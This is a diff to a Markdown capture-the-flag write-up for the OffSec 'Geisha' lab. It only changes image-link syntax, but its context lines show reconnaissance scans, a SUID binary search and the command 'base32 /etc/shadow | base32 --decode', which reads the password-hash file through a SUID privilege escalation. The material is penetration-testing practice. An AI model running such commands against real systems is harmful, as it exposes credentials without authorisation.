@@ -129,7 +129,7 @@ ftp> exit
 
 ## HTTP
 ### 80
-![](Pasted%20image%2020260510162443.png)
+![[Pasted image 20260510162443.png]]
 ```zsh
 ┌──(kali㉿kali)-[~/CTF/OffSec/Geisha]
 └─$ whatweb -a 3 http://192.168.201.82                                           
@@ -349,7 +349,7 @@ security.html           [Status: 200, Size: 9550, Words: 1639, Lines: 172, Durat
 - security.html
 
 
-![](Pasted%20image%2020260510180411.png)
+![[Pasted image 20260510180411.png]]
 
 ### 9198
 
@@ -506,7 +506,7 @@ geisha@geisha:~$ find / -perm -4000 -type f 2>/dev/null
 ```
 /usr/bin/base32
 
-![](Pasted%20image%2020260510184944.png)
+![[Pasted image 20260510184944.png]]
 
 ```zsh
 geisha@geisha:~$ base32 /etc/shadow | base32 --decode
